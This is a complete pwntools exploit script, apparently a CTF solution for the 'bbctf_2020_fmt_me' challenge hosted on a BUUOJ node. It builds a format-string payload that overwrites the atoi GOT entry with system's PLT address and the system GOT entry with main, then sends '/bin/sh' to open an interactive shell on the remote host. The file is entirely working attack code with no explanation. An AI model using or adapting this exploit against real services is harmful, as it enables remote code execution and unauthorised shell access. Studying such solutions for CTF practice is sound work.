from pwn import *

context.arch = 'amd64'

#p = process('./bbctf_2020_fmt_me')
p = remote('node4.buuoj.cn', 27038)
elf = ELF('bbctf_2020_fmt_me')

system_got = elf.got['system']
system_plt = elf.plt['system']
atoi_got = elf.got['atoi']
main = elf.sym['main']

payload = fmtstr_payload(6, { atoi_got: system_plt + 6, system_got: main })

p.sendlineafter(b'Choice: ', b'2')
p.sendlineafter(b'gift.', payload)

p.sendlineafter(b'Choice: ', b'/bin/sh')

p.interactive()